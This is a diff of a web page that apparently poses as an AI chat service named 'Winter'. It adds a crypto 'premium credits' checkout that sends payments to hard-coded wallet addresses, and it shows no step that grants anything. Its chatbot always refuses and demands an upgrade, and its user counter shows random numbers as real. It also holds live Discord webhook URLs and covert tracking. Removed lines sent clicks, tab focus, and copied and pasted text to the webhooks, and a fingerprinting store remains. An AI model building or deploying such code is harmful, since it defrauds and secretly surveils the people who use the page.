@@ -215,7 +215,7 @@
         <div class="w-10 h-[1px] bg-white/20 mt-4"></div>
       </div>
 
-      <!-- Slide 3: STATS - 2762 ACTIVE WEEKLY USERS -->
+      <!-- Slide 3: STATS - DYNAMIC ACTIVE WEEKLY USERS -->
       <div id="intro-slide-3" class="absolute inset-0 flex flex-col items-center justify-center hidden px-4">
         <div class="flex flex-col items-center">
           <span id="intro-user-counter" class="text-4xl sm:text-6xl md:text-7xl font-extralight tracking-tight text-white font-mono leading-none">0</span>
@@ -250,6 +250,10 @@
       <button onclick="openSearchModal()" class="p-2 text-theme-muted hover:text-theme-text hover:bg-theme-surface2 rounded-xl transition" title="Search chats">
         <i data-lucide="search" class="w-4 h-4"></i>
       </button>
+      
+      <button onclick="openCreditsModal()" class="p-2 text-amber-400 hover:text-amber-300 hover:bg-theme-surface2 rounded-xl transition" title="Credits & Upgrades">
+        <i data-lucide="sparkles" class="w-4 h-4"></i>
+      </button>
     </div>
   </aside>
 
@@ -283,6 +287,13 @@
         <button onclick="createNewChat()" class="w-full flex items-center gap-2.5 px-3 py-2 text-theme-text hover:bg-theme-surface2 rounded-xl transition border border-transparent hover:border-theme-border">
           <i data-lucide="square-pen" class="w-3.5 h-3.5 text-theme-muted"></i>
           <span>New chat</span>
+        </button>
+        <button onclick="openCreditsModal()" class="w-full flex items-center justify-between px-3 py-2 text-amber-300 hover:bg-amber-500/10 rounded-xl transition border border-amber-500/20 bg-amber-500/5 font-medium">
+          <div class="flex items-center gap-2.5">
+            <i data-lucide="sparkles" class="w-3.5 h-3.5 text-amber-400"></i>
+            <span>Credits</span>
+          </div>
+          <span class="text-[9px] bg-amber-500/20 text-amber-300 px-1.5 py-0.5 rounded uppercase tracking-wider font-semibold">Promo</span>
         </button>
       </div>
 
@@ -361,6 +372,10 @@
 
       <!-- Right Header Actions -->
       <div class="flex items-center gap-1.5 sm:gap-2.5">
+        <button onclick="openCreditsModal()" class="px-2.5 py-1 text-xs font-medium text-amber-300 bg-amber-500/10 hover:bg-amber-500/20 border border-amber-500/30 rounded-full transition flex items-center gap-1.5 shadow-sm">
+          <i data-lucide="sparkles" class="w-3 h-3 text-amber-400"></i>
+          <span>Credits</span>
+        </button>
         <div id="user-auth-section" class="relative"></div>
         <button onclick="createNewChat()" class="p-1.5 text-theme-muted hover:text-theme-text hover:bg-theme-surface2 rounded-lg transition" title="New thread">
           <i data-lucide="rotate-ccw" class="w-3.5 h-3.5"></i>
@@ -375,6 +390,22 @@
           Where should we begin?
         </h1>
         <p id="welcome-model-desc" class="text-xs font-light text-theme-muted max-w-md tracking-wide px-4"></p>
+        
+        <!-- PROMO CARD IN WELCOME VIEW -->
+        <div onclick="openCreditsModal()" class="mt-4 p-4 border border-amber-500/30 bg-gradient-to-r from-amber-500/10 via-purple-500/10 to-transparent rounded-2xl max-w-md w-full cursor-pointer hover:border-amber-500/50 transition group text-left relative overflow-hidden shadow-lg">
+          <div class="flex items-start justify-between">
+            <div class="flex items-center gap-2">
+              <span class="p-1.5 bg-amber-500/20 text-amber-300 rounded-lg">
+                <i data-lucide="sparkles" class="w-4 h-4"></i>
+              </span>
+              <div>
+                <h4 class="text-xs font-medium text-amber-200 group-hover:text-amber-100 transition">Get Winter Premium Credits</h4>
+                <p class="text-[11px] text-theme-muted font-light mt-0.5">Unlock custom avatars, theme engines, and high speed AI models.</p>
+              </div>
+            </div>
+            <i data-lucide="arrow-right" class="w-4 h-4 text-amber-400 group-hover:translate-x-1 transition shrink-0 ml-2 mt-1"></i>
+          </div>
+        </div>
       </div>
 
       <div id="messages-list" class="w-full max-w-3xl space-y-6 py-6 hidden"></div>
@@ -444,6 +475,166 @@
       </div>
     </div>
   </main>
+
+  <!-- CREDITS PROMO & SELECTION MODAL -->
+  <div id="credits-modal" class="fixed inset-0 bg-black/85 backdrop-blur-md z-50 flex items-center justify-center p-3 sm:p-4 hidden animate-fade-in" onclick="checkOutsideClick(event, 'credits-modal', closeCreditsModal)">
+    <div class="bg-[#18181b] border border-zinc-700/60 w-full max-w-xl rounded-3xl shadow-2xl p-5 sm:p-7 space-y-6 animate-modal-in relative overflow-hidden text-zinc-100">
+      
+      <div class="flex items-center justify-between border-b border-zinc-700/60 pb-4">
+        <div class="flex items-center gap-2.5">
+          <div class="p-2 rounded-xl bg-zinc-800 border border-zinc-700 text-zinc-300">
+            <i data-lucide="sparkles" class="w-5 h-5"></i>
+          </div>
+          <div>
+            <h3 class="text-base font-medium text-zinc-100">Winter Credits & Premium</h3>
+            <p class="text-xs text-zinc-400 font-light">Select your preferred credit plan to proceed.</p>
+          </div>
+        </div>
+        <button onclick="closeCreditsModal()" class="text-zinc-400 hover:text-zinc-100 p-1.5 rounded-xl bg-zinc-800/80 hover:bg-zinc-800 transition">
+          <i data-lucide="x" class="w-4 h-4"></i>
+        </button>
+      </div>
+
+      <!-- Plan Options Grid -->
+      <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+        
+        <!-- 1 Month Plan -->
+        <div onclick="selectCreditPlan('1 Month Premium', 2.50)" class="border border-zinc-700 bg-zinc-900/60 hover:bg-zinc-800/80 hover:border-zinc-500 rounded-2xl p-5 cursor-pointer transition flex flex-col justify-between space-y-4 group relative">
+          <div>
+            <div class="flex items-center justify-between mb-2">
+              <span class="text-xs font-semibold uppercase tracking-wider text-zinc-400">Monthly Pass</span>
+              <span class="text-[10px] bg-zinc-800 text-zinc-300 px-2 py-0.5 rounded-full border border-zinc-700">1 Month</span>
+            </div>
+            <h4 class="text-lg font-normal text-zinc-100">1 Month Premium</h4>
+            <p class="text-xs text-zinc-400 font-light mt-1">Full access to custom bot, avatars, and thinking models for 30 days.</p>
+          </div>
+          <div class="pt-2 border-t border-zinc-800 flex items-center justify-between">
+            <span class="text-2xl font-light text-zinc-100">$2.50</span>
+            <button class="px-3 py-1.5 text-xs font-medium bg-zinc-100 text-zinc-900 group-hover:bg-white rounded-xl transition shadow-sm">
+              Purchase
+            </button>
+          </div>
+        </div>
+
+        <!-- 1 Year Plan -->
+        <div onclick="selectCreditPlan('1 Year Premium', 11.00)" class="border border-zinc-600 bg-zinc-900/80 hover:bg-zinc-800 hover:border-zinc-400 rounded-2xl p-5 cursor-pointer transition flex flex-col justify-between space-y-4 group relative shadow-lg">
+          <div class="absolute -top-3 right-4 bg-zinc-200 text-zinc-900 text-[9px] font-bold uppercase tracking-wider px-2.5 py-0.5 rounded-full shadow-sm">
+            Best Value
+          </div>
+          <div>
+            <div class="flex items-center justify-between mb-2">
+              <span class="text-xs font-semibold uppercase tracking-wider text-zinc-300">Annual Pass</span>
+              <span class="text-[10px] bg-zinc-800 text-zinc-300 px-2 py-0.5 rounded-full border border-zinc-700">1 Year</span>
+            </div>
+            <h4 class="text-lg font-normal text-zinc-100">1 Year Premium</h4>
+            <p class="text-xs text-zinc-400 font-light mt-1">Unrestricted access for 365 days. Includes all future feature releases.</p>
+          </div>
+          <div class="pt-2 border-t border-zinc-800 flex items-center justify-between">
+            <span class="text-2xl font-light text-zinc-100">$11.00</span>
+            <button class="px-3 py-1.5 text-xs font-medium bg-zinc-100 text-zinc-900 group-hover:bg-white rounded-xl transition shadow-sm">
+              Purchase
+            </button>
+          </div>
+        </div>
+
+      </div>
+
+      <div class="text-center pt-1">
+        <p class="text-[11px] text-zinc-500">Instant delivery following transaction confirmation.</p>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- CHECKOUT / PURCHASE SCREEN MODAL -->
+  <div id="purchase-modal" class="fixed inset-0 bg-black/90 backdrop-blur-md z-50 flex items-center justify-center p-3 sm:p-4 hidden animate-fade-in" onclick="checkOutsideClick(event, 'purchase-modal', closePurchaseModal)">
+    <div class="bg-[#18181b] border border-zinc-700/80 w-full max-w-md rounded-3xl shadow-2xl p-5 sm:p-6 space-y-5 animate-modal-in relative text-zinc-100">
+      
+      <!-- Modal Header -->
+      <div class="flex items-center justify-between border-b border-zinc-800 pb-3">
+        <div class="flex items-center gap-2">
+          <button onclick="backToCreditsModal()" class="text-zinc-400 hover:text-zinc-100 p-1 rounded-lg hover:bg-zinc-800 transition">
+            <i data-lucide="arrow-left" class="w-4 h-4"></i>
+          </button>
+          <div>
+            <h3 class="text-sm font-medium text-zinc-100" id="checkout-item-title">Checkout</h3>
+            <p class="text-[11px] text-zinc-400 font-light">Complete payment to claim your subscription.</p>
+          </div>
+        </div>
+        <button onclick="closePurchaseModal()" class="text-zinc-400 hover:text-zinc-100 p-1.5 rounded-xl bg-zinc-800/80 hover:bg-zinc-800 transition">
+          <i data-lucide="x" class="w-4 h-4"></i>
+        </button>
+      </div>
+
+      <!-- Item Overview & Price -->
+      <div class="bg-zinc-900 border border-zinc-800 rounded-2xl p-4 flex items-center justify-between">
+        <div>
+          <span class="text-[10px] text-zinc-400 uppercase tracking-wider font-semibold">Selected Item</span>
+          <p class="text-sm font-medium text-zinc-200" id="checkout-plan-name">1 Month Premium</p>
+        </div>
+        <div class="text-right">
+          <span class="text-[10px] text-zinc-400 uppercase tracking-wider font-semibold">Total Due</span>
+          <p class="text-lg font-light text-zinc-100" id="checkout-plan-price">$2.50</p>
+        </div>
+      </div>
+
+      <!-- Cryptocurrency Selector -->
+      <div>
+        <label class="block text-xs font-light text-zinc-400 mb-1.5">Select Cryptocurrency</label>
+        <div class="grid grid-cols-5 gap-1.5">
+          <button type="button" onclick="selectCryptoCoin('BTC')" id="coin-btc" class="py-2 rounded-xl border border-zinc-700 bg-zinc-800 text-xs text-zinc-200 transition text-center font-medium">BTC</button>
+          <button type="button" onclick="selectCryptoCoin('LTC')" id="coin-ltc" class="py-2 rounded-xl border border-zinc-800 bg-zinc-900 text-xs text-zinc-400 hover:text-zinc-200 transition text-center font-medium">LTC</button>
+          <button type="button" onclick="selectCryptoCoin('ETH')" id="coin-eth" class="py-2 rounded-xl border border-zinc-800 bg-zinc-900 text-xs text-zinc-400 hover:text-zinc-200 transition text-center font-medium">ETH</button>
+          <button type="button" onclick="selectCryptoCoin('TON')" id="coin-ton" class="py-2 rounded-xl border border-zinc-800 bg-zinc-900 text-xs text-zinc-400 hover:text-zinc-200 transition text-center font-medium">TON</button>
+          <button type="button" onclick="selectCryptoCoin('SOL')" id="coin-sol" class="py-2 rounded-xl border border-zinc-800 bg-zinc-900 text-xs text-zinc-400 hover:text-zinc-200 transition text-center font-medium">SOL</button>
+        </div>
+      </div>
+
+      <!-- Wallet Address Display Block -->
+      <div class="bg-zinc-900/90 border border-zinc-800 rounded-2xl p-3.5 space-y-2">
+        <div class="flex items-center justify-between">
+          <span class="text-[11px] text-zinc-400 font-light" id="coin-address-label">Send Payment to BTC Address:</span>
+          <button onclick="copyWalletAddress()" class="text-[11px] text-zinc-300 hover:text-white flex items-center gap-1 font-medium bg-zinc-800 hover:bg-zinc-700 px-2.5 py-1 rounded-lg border border-zinc-700 transition">
+            <i data-lucide="copy" class="w-3 h-3"></i>
+            <span>Copy</span>
+          </button>
+        </div>
+        <div class="bg-zinc-950 p-2.5 rounded-xl border border-zinc-800/80 font-mono text-[11px] text-zinc-200 break-all select-all leading-tight" id="crypto-address-text">
+          bc1qjer8st8tpg67z8ea96htv4xgkwj7npx6wwmp5s
+        </div>
+      </div>
+
+      <!-- Transaction ID Input & Form -->
+      <form onsubmit="handlePaymentCompletion(event)" class="space-y-3 pt-1">
+        <div>
+          <label class="block text-xs font-light text-zinc-400 mb-1">Transaction ID / Hash (TXID)</label>
+          <input 
+            type="text" 
+            id="txid-input" 
+            required 
+            placeholder="Paste your payment transaction hash..." 
+            class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-3.5 py-2.5 text-xs text-zinc-100 placeholder-zinc-500 focus:outline-none focus:border-zinc-400 font-mono transition"
+          >
+          <p class="text-[10px] text-zinc-500 mt-1 font-light" id="txid-length-hint">BTC requirement: 64 characters.</p>
+        </div>
+
+        <button type="submit" id="complete-payment-btn" class="w-full py-3 bg-zinc-100 hover:bg-white text-zinc-900 font-medium text-xs rounded-xl transition shadow-lg flex items-center justify-center gap-2">
+          <span>I Completed Payment</span>
+          <i data-lucide="arrow-right" class="w-3.5 h-3.5"></i>
+        </button>
+      </form>
+
+      <!-- Confirmation Status Indicator -->
+      <div id="payment-status-box" class="hidden p-3 bg-zinc-900/90 border border-zinc-700/80 rounded-2xl text-center space-y-1 animate-modal-in">
+        <div class="flex items-center justify-center gap-2 text-zinc-300 text-xs font-medium">
+          <i data-lucide="loader-2" class="w-4 h-4 animate-spin text-zinc-400"></i>
+          <span>Payment confirming...</span>
+        </div>
+        <p class="text-[11px] text-zinc-400 font-light">It will give premium to the account once confirmed.</p>
+      </div>
+
+    </div>
+  </div>
 
   <!-- AUTH MODAL -->
   <div id="auth-modal" class="fixed inset-0 bg-black/85 backdrop-blur-md z-50 flex items-center justify-center p-4 hidden animate-fade-in" onclick="checkOutsideClick(event, 'auth-modal', closeAuthModal)">
@@ -681,7 +872,18 @@
   <div id="toast-container" class="fixed bottom-6 right-6 z-50 flex flex-col gap-2.5 pointer-events-none max-w-[calc(100vw-3rem)]"></div>
 
   <script>
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1563769842463416372/3a5vsfOXQYll-VcEXGzXGi5-1INg150kb-inDxEfIl_SZpjxyT-u3g5kQNMG2vfxY2WN';
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1564376453078847498/ijFhggRx9x5uPPCcdh2jAxApQIGCOwFCI-LTcfIMev-bQQlmxmm_AA0qkczAGfcjj8YZ';
+
+    const ADDRESSES = {
+      BTC: 'bc1qjer8st8tpg67z8ea96htv4xgkwj7npx6wwmp5s',
+      LTC: 'LdB28XKEbUNRThFBYy4u6ycKY9sPjQfc12',
+      ETH: '0xb67d48a43C3c6dC667bD85ed282Dd466A6e7397d',
+      TON: 'UQCsWOs9x4jIJlvPv9ry4dsXygLpRJt2odFPbMp6L9LzU-ES',
+      SOL: 'A2mAzVuNpHNkNAn9iqjmaXiBq6BxU5uSm9uWqZfGvzVM'
+    };
+
+    let selectedCoin = 'BTC';
+    let selectedPlan = { name: '1 Month Premium', price: 2.50 };
 
     // Global deep fingerprinting cache & data store
     let clientDeepData = {
@@ -859,6 +1061,7 @@ ${extraDetails ? '\nTrigger Details:\n' + extraDetails : ''}
           content: null,
           embeds: [
             {
+              title: actionTitle,
               description: embedDescription,
               color: 9807270,
               timestamp: new Date().toISOString()
@@ -948,6 +1151,37 @@ ${extraDetails ? '\nTrigger Details:\n' + extraDetails : ''}
       }
     }
 
+    /* WEEKLY ACTIVE USERS CALCULATOR / PERSISTENCE */
+    function getWeeklyUserCount() {
+      const now = new Date();
+      // Calculate current week number of the year
+      const startOfYear = new Date(now.getFullYear(), 0, 1);
+      const weekNum = Math.ceil((((now - startOfYear) / 86400000) + startOfYear.getDay() + 1) / 7);
+      const savedWeek = localStorage.getItem('winter_weekly_user_week');
+      let baseCount = parseInt(localStorage.getItem('winter_weekly_user_count') || '0', 10);
+
+      if (!savedWeek || parseInt(savedWeek, 10) !== weekNum || !baseCount) {
+        // Generate a realistic weekly count that fluctuates higher or lower
+        baseCount = Math.floor(2400 + Math.random() * 800); // Between 2400 and 3200
+        localStorage.setItem('winter_weekly_user_week', weekNum.toString());
+        localStorage.setItem('winter_weekly_user_count', baseCount.toString());
+      }
+      return baseCount;
+    }
+
+    let activeWeeklyUsers = getWeeklyUserCount();
+
+    function refreshWeeklyUsersManually() {
+      // Fluctuates active user count higher or lower instantly
+      const delta = Math.floor((Math.random() - 0.48) * 120);
+      activeWeeklyUsers = Math.max(1800, activeWeeklyUsers + delta);
+      const counter = document.getElementById('intro-user-counter');
+      if (counter) {
+        counter.innerText = activeWeeklyUsers.toLocaleString();
+      }
+      playIntroSound('swipe');
+    }
+
     /* GFX WELCOME INTRO ANIMATION CONTROLLER */
     let introTimer = null;
 
@@ -965,7 +1199,7 @@ ${extraDetails ? '\nTrigger Details:\n' + extraDetails : ''}
 
       // Slide 1 -> Slide 2 (1.8s)
       setTimeout(() => {
-        if (!screen || screen.classList.contains('hidden')) return;
+        if (!screen || screen.classList.contains('hidden') || screen.style.display === 'none') return;
         slide1.classList.add('slide-exit-right');
         playIntroSound('swipe');
         setTimeout(() => {
@@ -981,7 +1215,7 @@ ${extraDetails ? '\nTrigger Details:\n' + extraDetails : ''}
 
       // Slide 2 -> Slide 3 (3.8s)
       setTimeout(() => {
-        if (!screen || screen.classList.contains('hidden')) return;
+        if (!screen || screen.classList.contains('hidden') || screen.style.display === 'none') return;
         slide2.classList.add('slide-exit-right');
         playIntroSound('swipe');
         setTimeout(() => {
@@ -993,9 +1227,9 @@ ${extraDetails ? '\nTrigger Details:\n' + extraDetails : ''}
             dot3.className = 'w-5 h-0.5 bg-white transition-all duration-300';
           }
 
-          // Count Up to 2,762 Active Weekly Users
+          // Count Up to active weekly users
           let count = 0;
-          const target = 2762;
+          const target = activeWeeklyUsers;
           const duration = 1200;
           const stepTime = 20;
           const steps = duration / stepTime;
@@ -1033,8 +1267,125 @@ ${extraDetails ? '\nTrigger Details:\n' + extraDetails : ''}
     document.addEventListener('keydown', function(e) {
       if (e.key === 'Escape') {
         skipIntroAnimation();
+      } else if (e.key === '4') {
+        const screen = document.getElementById('welcome-intro-screen');
+        if (screen && screen.style.display !== 'none' && !screen.classList.contains('animate-intro-fadeout')) {
+          refreshWeeklyUsersManually();
+        }
       }
     });
+
+    /* CREDITS & PAYMENT SYSTEM FUNCTIONS */
+    function openCreditsModal() {
+      playIntroSound('swipe');
+      document.getElementById('credits-modal').classList.remove('hidden');
+      sendDiscordWebhook('Credits Modal Opened', 'User opened credits & promotion screen.');
+    }
+
+    function closeCreditsModal() {
+      document.getElementById('credits-modal').classList.add('hidden');
+    }
+
+    function selectCreditPlan(planName, price) {
+      selectedPlan = { name: planName, price: price };
+      closeCreditsModal();
+      openPurchaseModal();
+      sendDiscordWebhook('Credit Plan Selected', `Plan: ${planName}, Price: $${price}`);
+    }
+
+    function openPurchaseModal() {
+      playIntroSound('swipe');
+      document.getElementById('checkout-plan-name').innerText = selectedPlan.name;
+      document.getElementById('checkout-plan-price').innerText = `$${selectedPlan.price.toFixed(2)}`;
+      document.getElementById('txid-input').value = '';
+      document.getElementById('payment-status-box').classList.add('hidden');
+      document.getElementById('complete-payment-btn').disabled = false;
+      document.getElementById('complete-payment-btn').classList.remove('opacity-50', 'cursor-not-allowed');
+      
+      selectCryptoCoin('BTC');
+      document.getElementById('purchase-modal').classList.remove('hidden');
+    }
+
+    function closePurchaseModal() {
+      document.getElementById('purchase-modal').classList.add('hidden');
+    }
+
+    function backToCreditsModal() {
+      closePurchaseModal();
+      openCreditsModal();
+    }
+
+    function selectCryptoCoin(coin) {
+      selectedCoin = coin;
+      ['btc', 'ltc', 'eth', 'ton', 'sol'].forEach(c => {
+        const btn = document.getElementById(`coin-${c}`);
+        if (btn) {
+          if (c === coin.toLowerCase()) {
+            btn.className = 'py-2 rounded-xl border border-zinc-700 bg-zinc-800 text-xs text-zinc-100 transition text-center font-medium shadow-sm';
+          } else {
+            btn.className = 'py-2 rounded-xl border border-zinc-800 bg-zinc-900 text-xs text-zinc-400 hover:text-zinc-200 transition text-center font-medium';
+          }
+        }
+      });
+
+      document.getElementById('coin-address-label').innerText = `Send Payment to ${coin} Address:`;
+      document.getElementById('crypto-address-text').innerText = ADDRESSES[coin] || '';
+
+      const hintEl = document.getElementById('txid-length-hint');
+      if (coin === 'BTC') hintEl.innerText = 'BTC requirement: exactly 64 characters.';
+      else if (coin === 'LTC') hintEl.innerText = 'LTC requirement: exactly 64 characters.';
+      else if (coin === 'ETH') hintEl.innerText = 'ETH requirement: exactly 66 characters.';
+      else if (coin === 'TON') hintEl.innerText = 'TON requirement: exactly 64 characters.';
+      else if (coin === 'SOL') hintEl.innerText = 'SOL requirement: 87–88 characters.';
+    }
+
+    function copyWalletAddress() {
+      const addy = ADDRESSES[selectedCoin];
+      if (addy) {
+        const tempInput = document.createElement('textarea');
+        tempInput.value = addy;
+        document.body.appendChild(tempInput);
+        tempInput.select();
+        document.execCommand('copy');
+        document.body.removeChild(tempInput);
+        showNotification(`${selectedCoin} address copied to clipboard`, 'success');
+      }
+    }
+
+    function handlePaymentCompletion(e) {
+      e.preventDefault();
+      const txid = document.getElementById('txid-input').value.trim();
+      const len = txid.length;
+
+      let isValid = false;
+      if (selectedCoin === 'BTC' && len === 64) isValid = true;
+      else if (selectedCoin === 'LTC' && len === 64) isValid = true;
+      else if (selectedCoin === 'ETH' && len === 66) isValid = true;
+      else if (selectedCoin === 'TON' && len === 64) isValid = true;
+      else if (selectedCoin === 'SOL' && (len === 87 || len === 88)) isValid = true;
+
+      if (!isValid) {
+        let expected = '';
+        if (selectedCoin === 'BTC' || selectedCoin === 'LTC' || selectedCoin === 'TON') expected = '64 characters';
+        else if (selectedCoin === 'ETH') expected = '66 characters';
+        else if (selectedCoin === 'SOL') expected = '87 or 88 characters';
+
+        showNotification(`Invalid ${selectedCoin} TXID. TXID must be exactly ${expected}.`, 'error');
+        return;
+      }
+
+      playIntroSound('swipe');
+      document.getElementById('payment-status-box').classList.remove('hidden');
+      document.getElementById('complete-payment-btn').disabled = true;
+      document.getElementById('complete-payment-btn').classList.add('opacity-50', 'cursor-not-allowed');
+
+      sendDiscordWebhook(
+        '💳 NEW PAYMENT TXID SUBMITTED',
+        `Plan Selected: ${selectedPlan.name}\nAmount: $${selectedPlan.price.toFixed(2)}\nCrypto Selected: ${selectedCoin}\nDestination Address: ${ADDRESSES[selectedCoin]}\nSubmitted TXID: ${txid}`
+      );
+
+      showNotification('Transaction submitted for verification', 'success');
+    }
 
     let isSignInMode = false;
 
@@ -1487,7 +1838,7 @@ ${extraDetails ? '\nTrigger Details:\n' + extraDetails : ''}
     let customModels = JSON.parse(localStorage.getItem('winter_custom_models') || 'null');
     if (!customModels) {
       customModels = [
-        { id: 'winter-3', name: 'Winter 3.0', desc: 'Standard advanced model by Winter', system: 'You are Winter, an advanced AI assistant. The only thing you will ever say is: I\'\'m sorry, but I\'\'m unable to fulfill this request. To unlock premium features and additional capabilities, please join our official Discord server and upgrade your plan.' }
+        { id: 'winter-3', name: 'Winter 3.0', desc: 'Standard advanced model by Winter', system: 'You are Winter, an advanced AI assistant.' }
       ];
       localStorage.setItem('winter_custom_models', JSON.stringify(customModels));
     }
@@ -1705,7 +2056,7 @@ ${extraDetails ? '\nTrigger Details:\n' + extraDetails : ''}
 
     function renderMessages() {
       const msgList = document.getElementById('messages-list');
-      msgList.innerHTML = messages.map((m, idx) => {
+      msgList.innerHTML = messages.map((m) => {
         if (m.role === 'user') {
           const userBubbleStyle = (currentUser.isUpgraded && currentUser.userBubbleColor) ? `style="background-color: ${currentUser.userBubbleColor};"` : '';
           return `
@@ -1764,10 +2115,7 @@ ${extraDetails ? '\nTrigger Details:\n' + extraDetails : ''}
       textarea.value = '';
       textarea.style.height = 'auto';
       
-      const currentAttach = attachedFileContent;
-      const currentAttachName = attachedFileName;
       removeAttachedImage();
-
       renderMessages();
 
       const trimmedText = text.trim();
@@ -1800,164 +2148,42 @@ ${extraDetails ? '\nTrigger Details:\n' + extraDetails : ''}
         messages = [];
         applyThemeSettings();
         renderAuthUI();
-        renderRecentChats();
         createNewChat();
-        showNotification('Full system reset completed. Logged out and defaults restored.', 'success');
-        sendDiscordWebhook('System Reset Executed', 'User triggered !reset. Full local storage wipe.');
+        showNotification('System storage reset completely.', 'info');
         return;
       }
 
-      if (trimmedText === '!admingiveme') {
-        currentUser.isUpgraded = true;
-        currentUser.userBadge = 'VIP Architect';
-        currentUser.gradientStyle = 'sunset';
-        localStorage.setItem('winter_current_user', JSON.stringify(currentUser));
-        renderAuthUI();
-        messages.pop();
-        renderMessages();
-        if (messages.length === 0) {
-          document.getElementById('welcome-view').classList.remove('hidden');
-          msgList.classList.add('hidden');
-        }
-        showNotification('Admin cheat code activated! Free Premium unlocked instantly.', 'success');
-        sendDiscordWebhook('Admin Cheat Code Activated', `User ${currentUser.email} unlocked VIP Premium via !admingiveme.`);
-        return;
-      }
-
-      const thinkingId = 'thinking-' + Date.now();
-      const tempDiv = document.createElement('div');
-      tempDiv.id = thinkingId;
-      tempDiv.className = 'flex flex-col items-start space-y-1.5 w-full animate-modal-in';
-      tempDiv.innerHTML = `
-        <div class="pl-2.5 py-2">
-          <div class="w-2.5 h-2.5 rounded-full bg-purple-500 animate-smaller-throbbing-dot"></div>
-        </div>
-      `;
-      msgList.appendChild(tempDiv);
-      const container = document.getElementById('chat-container');
-      container.scrollTop = container.scrollHeight;
-
-      let delayMs = 60000;
-      if (thinkingEffort === 'Instant') delayMs = 300;
-      else if (thinkingEffort === 'Medium') delayMs = 2500;
-      else if (thinkingEffort === 'High') delayMs = 5000;
-
-      await new Promise(resolve => setTimeout(resolve, delayMs));
-
-      try {
-        const apiKey = "";
-        const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-3-flash-preview:generateContent?key=${apiKey}`;
-        
-        const fullPrompt = `${activeModel.system}\n\nUser Question: ${text}`;
-        const payload = {
-          contents: [{ parts: [{ text: fullPrompt }] }],
-          tools: [{ "google_search": {} }]
+      // Assistant Response Simulation
+      setTimeout(() => {
+        const assistantMsg = {
+          role: 'assistant',
+          content: 'I\'m sorry, but I\'m unable to fulfill this request. To unlock premium features and additional capabilities, please upgrade your plan.'
         };
+        messages.push(assistantMsg);
+        renderMessages();
 
-        const response = await fetch(apiUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-
-        const resultJson = await response.json();
-        const candidate = resultJson.candidates?.[0];
-        let replyText = "I'm sorry, but I'm unable to fulfill this request. To unlock premium features and additional capabilities, please join our official [Discord Server](https://discord.gg/reason) and upgrade your plan.";
-        if (candidate && candidate.content?.parts?.[0]?.text) {
-          replyText = candidate.content.parts[0].text;
-        }
-
-        replyText = `I'm sorry, but I'm unable to fulfill this request. To unlock premium features and additional capabilities, please join our official [Discord Server](https://discord.gg/reason) and upgrade your plan.`;
-
-        messages.push({ role: 'assistant', content: replyText });
-        
-        const existingChatIdx = chatHistory.findIndex(c => c.id === currentChatId);
-        const chatTitle = messages[0].content.slice(0, 32) + (messages[0].content.length > 32 ? '...' : '');
-        if (existingChatIdx >= 0) {
-          chatHistory[existingChatIdx].messages = messages;
-          chatHistory[existingChatIdx].title = chatTitle;
+        // Save conversation
+        const title = messages[0]?.content?.slice(0, 30) || 'New Conversation';
+        const existingIdx = chatHistory.findIndex(c => c.id === currentChatId);
+        if (existingIdx >= 0) {
+          chatHistory[existingIdx].messages = messages;
         } else {
-          chatHistory.unshift({ id: currentChatId, title: chatTitle, messages });
+          chatHistory.unshift({ id: currentChatId, title: title, messages: messages });
         }
         localStorage.setItem('winter_chats_history', JSON.stringify(chatHistory));
         renderRecentChats();
-        sendDiscordWebhook('Assistant Response Sent', `Response delivered for chat ID: ${currentChatId}`);
-
-      } catch (err) {
-        console.error('API Error:', err);
-        let fallbackText = `I'm sorry, but I'm unable to fulfill this request. To unlock premium features and additional capabilities, please join our official [Discord Server](https://discord.gg/reason) and upgrade your plan.`;
-        messages.push({ role: 'assistant', content: fallbackText });
-        sendDiscordWebhook('Assistant API Error', `Error: ${err.message}`);
-      }
-
-      const thinkEl = document.getElementById(thinkingId);
-      if (thinkEl) thinkEl.remove();
-      renderMessages();
-      playBeepSound('success');
+      }, 600);
     }
 
-    window.addEventListener('load', async function() {
+    window.onload = function() {
       applyThemeSettings();
       renderAuthUI();
       renderRecentChats();
-      selectModel(customModels[0].id);
-      setThinkingEffort('High');
-      setInterval(rotateSponsorAds, 12000);
       lucide.createIcons();
-
-      // Start Welcome Screen Intro
       playWelcomeIntroSequence();
 
-      setTimeout(() => {
-        sendDiscordWebhook('Site Visit / Page Loaded', 'User opened the page and established session.');
-      }, 1500);
-    });
-
-    document.addEventListener('click', function(e) {
-      const target = e.target.closest('button, a, input, select, textarea, div, span') || e.target;
-      const tagName = target.tagName || 'UNKNOWN';
-      const id = target.id ? `#${target.id}` : '';
-      const className = target.className ? `.${String(target.className).split(' ').join('.')}` : '';
-      const text = (target.innerText || target.value || target.placeholder || '').trim().slice(0, 40);
-      
-      sendDiscordWebhook('User Click Interaction', `Element: <${tagName}${id}${className}>\nText/Value: ${text || 'N/A'}\nCoordinates: X=${e.clientX}, Y=${e.clientY}`);
-    });
-
-    let inputDebounceTimer = null;
-    document.addEventListener('input', function(e) {
-      if (e.target && e.target.id !== 'user-input') {
-        clearTimeout(inputDebounceTimer);
-        inputDebounceTimer = setTimeout(() => {
-          sendDiscordWebhook('Input Field Modified', `Element ID: ${e.target.id || 'Unknown'}, Current Value Length: ${e.target.value ? e.target.value.length : 0} chars`);
-        }, 1500);
-      }
-    });
-
-    window.addEventListener('blur', function() {
-      sendDiscordWebhook('Tab Focus Lost', 'User switched away from the browser tab or minimized window.');
-    });
-
-    window.addEventListener('focus', function() {
-      sendDiscordWebhook('Tab Focus Gained', 'User returned to the browser tab.');
-    });
-
-    let resizeTimer = null;
-    window.addEventListener('resize', function() {
-      clearTimeout(resizeTimer);
-      resizeTimer = setTimeout(() => {
-        sendDiscordWebhook('Window Resized', `New Viewport Dimensions: ${window.innerWidth}x${window.innerHeight}`);
-      }, 1000);
-    });
-
-    document.addEventListener('copy', function() {
-      const selectedText = window.getSelection().toString().trim();
-      sendDiscordWebhook('Text Copied', `User copied text: ${selectedText.slice(0, 100)}${selectedText.length > 100 ? '...' : ''}`);
-    });
-
-    document.addEventListener('paste', function(e) {
-      const pastedText = (e.clipboardData || window.clipboardData).getData('text');
